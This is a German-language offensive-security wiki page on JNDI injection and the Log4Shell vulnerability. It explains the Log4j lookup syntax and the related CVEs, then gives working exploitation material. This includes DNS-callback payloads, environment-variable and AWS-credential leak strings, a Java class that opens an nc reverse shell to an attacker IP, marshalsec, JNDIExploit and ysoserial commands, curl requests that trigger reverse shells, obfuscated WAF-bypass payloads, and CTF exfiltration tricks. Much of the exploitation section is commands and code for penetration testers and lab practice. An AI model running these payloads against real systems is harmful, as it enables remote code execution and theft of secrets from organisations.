# JNDI - Java Naming and Directory Interface & Log4Shell

{{#include ../../banners/hacktricks-training.md}}

## Grundinformationen

JNDI, seit den späten 1990er Jahren in Java integriert, dient als Verzeichnisdienst, der es Java-Programmen ermöglicht, Daten oder Objekte über ein Namenssystem zu finden. Es unterstützt verschiedene Verzeichnisdienste über Service Provider Interfaces (SPIs) und ermöglicht den Datenabruf aus verschiedenen Systemen, einschließlich remote Java-Objekten. Zu den gängigen SPIs gehören CORBA COS, Java RMI Registry und LDAP.

### JNDI Namensreferenz

Java-Objekte können mithilfe von JNDI Namensreferenzen gespeichert und abgerufen werden, die in zwei Formen vorliegen:

- **Referenzadressen**: Gibt den Standort eines Objekts an (z. B. _rmi://server/ref_), was eine direkte Abholung von der angegebenen Adresse ermöglicht.
- **Remote Factory**: Verweist auf eine Remote-Fabrikklasse. Bei Zugriff wird die Klasse von dem Remote-Standort heruntergeladen und instanziiert.

Dieses Mechanismus kann jedoch ausgenutzt werden, was potenziell zum Laden und Ausführen von beliebigem Code führen kann. Als Gegenmaßnahme:

- **RMI**: `java.rmi.server.useCodebaseOnly = true` standardmäßig ab JDK 7u21, was das Laden von Remote-Objekten einschränkt. Ein Security Manager schränkt weiter ein, was geladen werden kann.
- **LDAP**: `com.sun.jndi.ldap.object.trustURLCodebase = false` standardmäßig ab JDK 6u141, 7u131, 8u121, was die Ausführung von remote geladenen Java-Objekten blockiert. Wenn auf `true` gesetzt, ist die Ausführung von Remote-Code ohne Aufsicht eines Security Managers möglich.
- **CORBA**: Hat keine spezifische Eigenschaft, aber der Security Manager ist immer aktiv.

Der **Naming Manager**, der für die Auflösung von JNDI-Links verantwortlich ist, verfügt jedoch nicht über integrierte Sicherheitsmechanismen, was potenziell das Abrufen von Objekten aus beliebigen Quellen ermöglicht. Dies stellt ein Risiko dar, da RMI-, LDAP- und CORBA-Schutzmaßnahmen umgangen werden können, was zum Laden beliebiger Java-Objekte oder zur Ausnutzung vorhandener Anwendungsbestandteile (Gadgets) zur Ausführung von schädlichem Code führen kann.

Beispiele für ausnutzbare URLs sind:

- _rmi://attacker-server/bar_
- _ldap://attacker-server/bar_
- _iiop://attacker-server/bar_

Trotz der Schutzmaßnahmen bleiben Schwachstellen bestehen, hauptsächlich aufgrund des Fehlens von Sicherheitsvorkehrungen gegen das Laden von JNDI aus nicht vertrauenswürdigen Quellen und der Möglichkeit, bestehende Schutzmaßnahmen zu umgehen.

### JNDI Beispiel

![](<../../images/image (1022).png>)

Selbst wenn Sie eine **`PROVIDER_URL`** festgelegt haben, können Sie eine andere in einem Lookup angeben, und sie wird abgerufen: `ctx.lookup("<attacker-controlled-url>")`, und das ist es, was ein Angreifer ausnutzen wird, um beliebige Objekte von einem von ihm kontrollierten System zu laden.

### CORBA Übersicht

CORBA (Common Object Request Broker Architecture) verwendet eine **Interoperable Object Reference (IOR)**, um remote Objekte eindeutig zu identifizieren. Diese Referenz enthält wesentliche Informationen wie:

- **Typ-ID**: Eindeutiger Identifikator für ein Interface.
- **Codebase**: URL zum Abrufen der Stub-Klasse.

Es ist erwähnenswert, dass CORBA nicht von Natur aus anfällig ist. Die Gewährleistung der Sicherheit umfasst typischerweise:

- Installation eines **Security Managers**.
- Konfiguration des Security Managers, um Verbindungen zu potenziell schädlichen Codebasen zuzulassen. Dies kann erreicht werden durch:
- Socket-Berechtigung, z. B. `permissions java.net.SocketPermission "*:1098-1099", "connect";`.
- Dateileseberechtigungen, entweder universell (`permission java.io.FilePermission "<<ALL FILES>>", "read";`) oder für spezifische Verzeichnisse, in denen schädliche Dateien platziert werden könnten.

Einige Richtlinien von Anbietern könnten jedoch nachsichtig sein und diese Verbindungen standardmäßig zulassen.

### RMI Kontext

Für RMI (Remote Method Invocation) ist die Situation etwas anders. Wie bei CORBA ist das Herunterladen beliebiger Klassen standardmäßig eingeschränkt. Um RMI auszunutzen, müsste man typischerweise den Security Manager umgehen, was auch bei CORBA relevant ist.

### LDAP

Zunächst müssen wir zwischen einer Suche und einem Lookup unterscheiden.\
Eine **Suche** verwendet eine URL wie `ldap://localhost:389/o=JNDITutorial`, um das JNDITutorial-Objekt von einem LDAP-Server zu finden und **seine Attribute abzurufen**.\
Ein **Lookup** ist für **Namensdienste** gedacht, da wir **alles abrufen möchten, was an einen Namen gebunden ist**.

Wenn die LDAP-Suche mit **SearchControls.setReturningObjFlag() mit `true` aufgerufen wurde, wird das zurückgegebene Objekt rekonstruiert**.

Daher gibt es mehrere Möglichkeiten, diese Optionen anzugreifen.\
Ein **Angreifer kann LDAP-Datensätze vergiften, indem er Payloads einführt**, die in den Systemen, die sie sammeln, ausgeführt werden (sehr nützlich, um **Dutzende von Maschinen zu kompromittieren**, wenn Sie Zugriff auf den LDAP-Server haben). Eine andere Möglichkeit, dies auszunutzen, wäre, einen **MitM-Angriff in einer LDAP-Suche** durchzuführen.

Falls Sie **eine App dazu bringen können, eine JNDI LDAP-URL aufzulösen**, können Sie den LDAP steuern, der durchsucht wird, und Sie könnten den Exploit zurücksenden (log4shell).

#### Deserialisierungs-Exploit

![](<../../images/image (275).png>)

Der **Exploit ist serialisiert** und wird deserialisiert.\
Falls `trustURLCodebase` auf `true` gesetzt ist, kann ein Angreifer seine eigenen Klassen in der Codebase bereitstellen, andernfalls muss er Gadgets im Classpath ausnutzen.

#### JNDI Referenz-Exploit

Es ist einfacher, diesen LDAP mit **JavaFactory-Referenzen** anzugreifen:

![](<../../images/image (1059).png>)

## Log4Shell Schwachstelle

Die Schwachstelle wird in Log4j eingeführt, da es eine [**besondere Syntax**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) in der Form `${prefix:name}` unterstützt, wobei `prefix` einer von mehreren verschiedenen [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html) ist, die `name` ausgewertet werden soll. Zum Beispiel ist `${java:version}` die aktuell laufende Version von Java.

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) führte eine `jndi` Lookup-Funktion ein. Diese Funktion ermöglicht den Abruf von Variablen über JNDI. Typischerweise wird der Schlüssel automatisch mit `java:comp/env/` vorangestellt. Wenn der Schlüssel selbst jedoch ein **":"** enthält, wird dieses Standardpräfix nicht angewendet.

Mit einem **: im Schlüssel**, wie in `${jndi:ldap://example.com/a}`, gibt es **kein Präfix**, und der **LDAP-Server wird nach dem Objekt abgefragt**. Und diese Lookups können sowohl in der Konfiguration von Log4j als auch beim Protokollieren von Zeilen verwendet werden.

Daher ist das einzige, was benötigt wird, um RCE zu erhalten, eine **anfällige Version von Log4j, die Informationen verarbeitet, die vom Benutzer kontrolliert werden**. Und da dies eine Bibliothek ist, die von Java-Anwendungen weit verbreitet verwendet wird, um Informationen zu protokollieren (einschließlich internetfähiger Anwendungen), war es sehr häufig, dass log4j beispielsweise HTTP-Header wie den User-Agent protokollierte. Log4j wird jedoch **nicht nur verwendet, um HTTP-Informationen zu protokollieren, sondern auch alle Eingaben** und Daten, die der Entwickler angegeben hat.

## Übersicht über Log4Shell-bezogene CVEs

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[Kritisch]**

Diese Schwachstelle ist ein kritischer **nicht vertrauenswürdiger Deserialisierungsfehler** im `log4j-core`-Komponenten, der Versionen von 2.0-beta9 bis 2.14.1 betrifft. Sie ermöglicht **remote code execution (RCE)**, wodurch Angreifer Systeme übernehmen können. Das Problem wurde von Chen Zhaojun vom Alibaba Cloud Security Team gemeldet und betrifft verschiedene Apache-Frameworks. Der ursprüngliche Fix in Version 2.15.0 war unvollständig. Sigma-Regeln zur Verteidigung sind verfügbar ([Regel 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j_fields.yml), [Regel 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j.yml)).

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **\[Kritisch]**

Ursprünglich niedrig eingestuft, aber später auf kritisch hochgestuft, ist dieser CVE ein **Denial of Service (DoS)**-Fehler, der aus einem unvollständigen Fix in 2.15.0 für CVE-2021-44228 resultiert. Er betrifft nicht standardmäßige Konfigurationen und ermöglicht es Angreifern, DoS-Angriffe durch ausgeklügelte Payloads zu verursachen. Ein [Tweet](https://twitter.com/marcioalm/status/1471740771581652995) zeigt eine Umgehungsmethode. Das Problem wurde in den Versionen 2.16.0 und 2.12.2 behoben, indem die Nachrichtenlookup-Muster entfernt und JNDI standardmäßig deaktiviert wurden.

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[Hoch]**

Diese Schwachstelle betrifft **Log4j 1.x-Versionen** in nicht standardmäßigen Konfigurationen, die `JMSAppender` verwenden, und ist ein nicht vertrauenswürdiger Deserialisierungsfehler. Es gibt keinen Fix für den 1.x-Zweig, der das Ende seiner Lebensdauer erreicht hat, und ein Upgrade auf `log4j-core 2.17.0` wird empfohlen.

### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[Moderat]**

Diese Schwachstelle betrifft das **Logback-Protokollierungsframework**, einen Nachfolger von Log4j 1.x. Zuvor als sicher angesehen, wurde das Framework als anfällig befunden, und neuere Versionen (1.3.0-alpha11 und 1.2.9) wurden veröffentlicht, um das Problem zu beheben.

### **CVE-2021-45105** **\[Hoch]**

Log4j 2.16.0 enthält einen DoS-Fehler, was zur Veröffentlichung von `log4j 2.17.0` zur Behebung des CVE führte. Weitere Details finden Sie im Bericht von BleepingComputer [hier](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/).

### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)

Diese Schwachstelle betrifft log4j Version 2.17 und erfordert, dass der Angreifer die Konfigurationsdatei von log4j kontrolliert. Sie beinhaltet potenzielle beliebige Codeausführung über einen konfigurierten JDBCAppender. Weitere Details sind im [Checkmarx-Blogbeitrag](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/) verfügbar.

## Log4Shell Ausnutzung

### Entdeckung

Diese Schwachstelle ist sehr einfach zu entdecken, wenn sie ungeschützt ist, da sie mindestens eine **DNS-Anfrage** an die Adresse sendet, die Sie in Ihrer Payload angeben. Daher Payloads wie:

- `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` (unter Verwendung von [canarytokens.com](https://canarytokens.org/generate))
- `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` (unter Verwendung von [interactsh](https://github.com/projectdiscovery/interactsh))
- `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (unter Verwendung von Burp Suite)
- `${jndi:ldap://2j4ayo.dnslog.cn}` (unter Verwendung von [dnslog](http://dnslog.cn))
- `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` (unter Verwendung von [huntress](https://log4shell.huntress.com))

Beachten Sie, dass **selbst wenn eine DNS-Anfrage empfangen wird, das nicht bedeutet, dass die Anwendung ausnutzbar** (oder sogar anfällig) ist; Sie müssen versuchen, sie auszunutzen.

> [!NOTE]
> Denken Sie daran, dass Sie zur **Ausnutzung von Version 2.15** die **localhost-Überprüfung umgehen** müssen: ${jndi:ldap://**127.0.0.1#**...}

#### **Lokale Entdeckung**

Suchen Sie nach **lokalen anfälligen Versionen** der Bibliothek mit:
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **Überprüfung**

Einige der zuvor aufgeführten Plattformen ermöglichen es Ihnen, einige variable Daten einzufügen, die protokolliert werden, wenn sie angefordert werden.\
Dies kann für 2 Dinge sehr nützlich sein:

- Um die **Schwachstelle** zu **verifizieren**
- Um **Informationen** durch Ausnutzung der Schwachstelle **exfiltrieren**

Zum Beispiel könnten Sie etwas anfordern wie:\
oder wie `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** und wenn eine **DNS-Anfrage mit dem Wert der Umgebungsvariable empfangen wird**, wissen Sie, dass die Anwendung anfällig ist.

Andere Informationen, die Sie versuchen könnten zu **leaken**:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE Informationen

> [!NOTE]
> Hosts, die auf JDK-Versionen über 6u141, 7u131 oder 8u121 laufen, sind gegen den LDAP-Klassenladeangriffsvektor geschützt. Dies liegt an der standardmäßigen Deaktivierung von `com.sun.jndi.ldap.object.trustURLCodebase`, die verhindert, dass JNDI eine Remote-Codebasis über LDAP lädt. Es ist jedoch wichtig zu beachten, dass diese Versionen **nicht gegen den Deserialisierungsangriffsvektor geschützt sind**.
>
> Für Angreifer, die darauf abzielen, diese höheren JDK-Versionen auszunutzen, ist es notwendig, ein **vertrauenswürdiges Gadget** innerhalb der Java-Anwendung zu nutzen. Werkzeuge wie ysoserial oder JNDIExploit werden häufig zu diesem Zweck verwendet. Im Gegensatz dazu ist das Ausnutzen niedrigerer JDK-Versionen relativ einfacher, da diese Versionen manipuliert werden können, um beliebige Klassen zu laden und auszuführen.
>
> Für **weitere Informationen** (_wie Einschränkungen bei RMI- und CORBA-Vektoren_) **überprüfen Sie den vorherigen Abschnitt zur JNDI-Namensreferenz** oder [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)

### RCE - Marshalsec mit benutzerdefiniertem Payload

Sie können dies in der **THM-Box** testen: [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

Verwenden Sie das Tool [**marshalsec**](https://github.com/mbechler/marshalsec) (JAR-Version verfügbar [**hier**](https://github.com/RandomRobbieBF/marshalsec-jar)). Dieser Ansatz richtet einen LDAP-Referenzserver ein, um Verbindungen an einen sekundären HTTP-Server umzuleiten, auf dem der Exploit gehostet wird:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
Um das Ziel dazu zu bringen, einen Reverse-Shell-Code zu laden, erstellen Sie eine Java-Datei mit dem Namen `Exploit.java` mit folgendem Inhalt:
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
Kompiliere die Java-Datei in eine Klassendatei mit: `javac Exploit.java -source 8 -target 8`. Starte als Nächstes einen **HTTP-Server** im Verzeichnis, das die Klassendatei enthält, mit: `python3 -m http.server`. Stelle sicher, dass der **marshalsec LDAP-Server** auf diesen HTTP-Server verweist.

Trigger die Ausführung der Exploit-Klasse auf dem anfälligen Webserver, indem du eine Payload versendest, die aussieht wie:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
**Hinweis:** Dieser Exploit basiert auf der Konfiguration von Java, die das Laden von Remote-Codebasen über LDAP erlaubt. Wenn dies nicht zulässig ist, ziehen Sie in Betracht, eine vertrauenswürdige Klasse für die Ausführung beliebigen Codes auszunutzen.

### RCE - **JNDIExploit**

> [!HINWEIS]
> Beachten Sie, dass der Autor dieses Projekt aus irgendeinem Grund nach der Entdeckung von log4shell von GitHub entfernt hat. Sie können eine zwischengespeicherte Version unter [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) finden, aber wenn Sie die Entscheidung des Autors respektieren möchten, verwenden Sie eine andere Methode, um diese Schwachstelle auszunutzen.
>
> Darüber hinaus können Sie den Quellcode nicht in der Wayback Machine finden, also analysieren Sie entweder den Quellcode oder führen Sie die Jar-Datei aus, in dem Wissen, dass Sie nicht wissen, was Sie ausführen.

Für dieses Beispiel können Sie einfach diesen **anfälligen Webserver für log4shell** auf Port 8080 ausführen: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_im README finden Sie, wie man ihn ausführt_). Diese anfällige App protokolliert mit einer anfälligen Version von log4shell den Inhalt des HTTP-Anforderungsheaders _X-Api-Version_.

Dann können Sie die **JNDIExploit** Jar-Datei herunterladen und sie mit folgendem Befehl ausführen:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
Nach nur ein paar Minuten des Lesens des Codes in _com.feihong.ldap.LdapServer_ und _com.feihong.ldap.HTTPServer_ kann man sehen, wie die **LDAP- und HTTP-Server erstellt werden**. Der LDAP-Server wird verstehen, welches Payload bereitgestellt werden muss, und wird das Opfer zum HTTP-Server umleiten, der den Exploit bereitstellt.\
In _com.feihong.ldap.gadgets_ finden Sie **einige spezifische Gadgets**, die verwendet werden können, um die gewünschte Aktion auszuführen (potenziell beliebigen Code auszuführen). Und in _com.feihong.ldap.template_ sehen Sie die verschiedenen Template-Klassen, die **die Exploits generieren**.

Sie können alle verfügbaren Exploits mit **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`** sehen. Einige nützliche sind:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
Also, in unserem Beispiel haben wir bereits die anfällige Docker-Anwendung am Laufen. Um sie anzugreifen:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
Beim Senden der Angriffe sehen Sie einige Ausgaben im Terminal, in dem Sie **JNDIExploit-1.2-SNAPSHOT.jar** ausgeführt haben.

**Denken Sie daran, `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` für andere Exploitationsoptionen zu überprüfen. Außerdem können Sie, falls erforderlich, den Port der LDAP- und HTTP-Server ändern.**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

Ähnlich wie beim vorherigen Exploit können Sie versuchen, [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) zu verwenden, um diese Schwachstelle auszunutzen.\
Sie können die URLs generieren, die Sie an das Opfer senden möchten, indem Sie Folgendes ausführen:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_Dieser Angriff mit einem benutzerdefinierten generierten Java-Objekt wird in Laboren wie dem **THM solar room** funktionieren. Allerdings wird dies im Allgemeinen nicht funktionieren (da Java standardmäßig nicht konfiguriert ist, um Remote-Codebasen über LDAP zu laden). Ich denke, das liegt daran, dass es keine vertrauenswürdige Klasse ausnutzt, um beliebigen Code auszuführen._

### RCE - JNDI-Injection-Exploit-Plus

[https://github.com/cckuailong/JNDI-Injection-Exploit-Plus](https://github.com/cckuailong/JNDI-Injection-Exploit-Plus) ist ein weiteres Tool zur Generierung von **funktionierenden JNDI-Links** und zur Bereitstellung von Hintergrunddiensten durch das Starten eines RMI-Servers, LDAP-Servers und HTTP-Servers.\

### RCE - ysoserial & JNDI-Exploit-Kit

Diese Option ist wirklich nützlich, um **Java-Versionen anzugreifen, die nur bestimmte Klassen vertrauen und nicht allen**. Daher wird **ysoserial** verwendet, um **Serialisierungen von vertrauenswürdigen Klassen** zu generieren, die als Gadgets verwendet werden können, um **beliebigen Code auszuführen** (_die von ysoserial ausgenutzte vertrauenswürdige Klasse muss vom Opfer-Java-Programm verwendet werden, damit der Exploit funktioniert_).

Mit **ysoserial** oder [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) können Sie den Deserialisierungs-Exploit erstellen, der von JNDI heruntergeladen wird:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
Verwenden Sie [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit), um **JNDI-Links** zu generieren, bei denen der Exploit auf Verbindungen von den anfälligen Maschinen wartet. Sie können **verschiedene Exploits, die automatisch vom JNDI-Exploit-Kit generiert werden können**, oder sogar Ihre **eigenen Deserialisierungs-Payloads** (von Ihnen oder ysoserial generiert) bereitstellen.
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../images/image (1118).png>)

Jetzt können Sie einen generierten JNDI-Link einfach verwenden, um die Schwachstelle auszunutzen und eine **Reverse-Shell** zu erhalten, indem Sie an eine verwundbare Version von log4j senden: **`${ldap://10.10.14.10:1389/generated}`**

### Umgehungen
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:ı}}:ldap://...} //Notice the unicode "i"
```
### Automatische Scanner

- [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
- [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
- [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
- [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
- [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
- [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
- [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
- [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - Finde lokale verwundbare Bibliotheken

### Labs zum Testen

- [**LogForge HTB-Maschine**](https://app.hackthebox.com/tracks/UHC-track)
- [**Try Hack Me Solar Raum**](https://tryhackme.com/room/solar)
- [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
- [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Post-Log4Shell Ausnutzung

In diesem [**CTF-Bericht**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) wird gut erklärt, wie es potenziell **möglich** ist, einige Funktionen von **Log4J** zu **missbrauchen**.

Die [**Sicherheitsseite**](https://logging.apache.org/log4j/2.x/security.html) von Log4j enthält einige interessante Sätze:

> Ab Version 2.16.0 (für Java 8) wurde die **Nachrichtenabfrage-Funktion vollständig entfernt**. **Abfragen in der Konfiguration funktionieren weiterhin**. Darüber hinaus deaktiviert Log4j jetzt standardmäßig den Zugriff auf JNDI. JNDI-Abfragen in der Konfiguration müssen jetzt ausdrücklich aktiviert werden.

> Ab Version 2.17.0 (und 2.12.3 und 2.3.1 für Java 7 und Java 6) werden **nur Abfragezeichenfolgen in der Konfiguration rekursiv erweitert**; bei jeder anderen Verwendung wird nur die oberste Abfrage aufgelöst, und alle verschachtelten Abfragen werden nicht aufgelöst.

Das bedeutet, dass Sie standardmäßig **vergessen können, einen `jndi`-Exploit zu verwenden**. Darüber hinaus müssen Sie sie konfigurieren, um **rekursive Abfragen** durchzuführen.

Zum Beispiel wurde in diesem CTF dies in der Datei log4j2.xml konfiguriert:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Env Lookups

In [diesem CTF](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/) kontrollierte der Angreifer den Wert von `${sys:cmd}` und musste die Flagge aus einer Umgebungsvariable exfiltrieren.\
Wie auf dieser Seite in [**früheren Payloads**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification) zu sehen ist, gibt es verschiedene Möglichkeiten, auf Umgebungsvariablen zuzugreifen, wie z.B.: **`${env:FLAG}`**. In diesem CTF war dies nutzlos, könnte aber in anderen realen Szenarien nützlich sein.

### Exfiltration in Exceptions

Im CTF **konnten Sie nicht auf stderr** der Java-Anwendung mit log4J zugreifen, aber Log4J **Ausnahmen werden an stdout gesendet**, was in der Python-App ausgegeben wurde. Das bedeutete, dass wir durch das Auslösen einer Ausnahme auf den Inhalt zugreifen konnten. Eine Ausnahme zur Exfiltration der Flagge war: **`${java:${env:FLAG}}`**. Dies funktioniert, weil **`${java:CTF{blahblah}}`** nicht existiert und eine Ausnahme mit dem Wert der Flagge angezeigt wird:

![](<../../images/image (1023).png>)

### Conversion Patterns Exceptions

Nur um es zu erwähnen, könnten Sie auch neue [**Conversion Patterns**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) injizieren und Ausnahmen auslösen, die in `stdout` protokolliert werden. Zum Beispiel:

![](<../../images/image (683).png>)

Dies wurde als nicht nützlich erachtet, um Daten innerhalb der Fehlermeldung zu exfiltrieren, da die Abfrage vor dem Conversion Pattern nicht gelöst wurde, könnte aber für andere Dinge wie die Erkennung nützlich sein.

### Conversion Patterns Regexes

Es ist jedoch möglich, einige **Conversion Patterns, die Regexes unterstützen**, zu verwenden, um Informationen aus einer Abfrage zu exfiltrieren, indem man Regexes verwendet und **binäre Suche** oder **zeitbasierte** Verhaltensweisen ausnutzt.

- **Binäre Suche über Ausnahme-Nachrichten**

Das Conversion Pattern **`%replace`** kann verwendet werden, um **Inhalte** aus einem **String** sogar unter Verwendung von **Regexes** zu **ersetzen**. Es funktioniert so: `replace{pattern}{regex}{substitution}`\
Durch das Ausnutzen dieses Verhaltens könnten Sie **eine Ausnahme auslösen, wenn das Regex etwas im String übereinstimmte** (und keine Ausnahme, wenn es nicht gefunden wurde) wie folgt:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
- **Zeitbasiert**

Wie im vorherigen Abschnitt erwähnt, unterstützt **`%replace`** **regexes**. Es ist also möglich, Payloads von der [**ReDoS-Seite**](../regular-expression-denial-of-service-redos.md) zu verwenden, um einen **Timeout** auszulösen, falls das Flag gefunden wird.\
Ein Beispiel für eine Payload wie `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` würde einen **Timeout** in diesem CTF auslösen.

In diesem [**Writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) wurde anstelle eines ReDoS-Angriffs ein **Amplifikationsangriff** verwendet, um einen Zeitunterschied in der Antwort zu verursachen:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
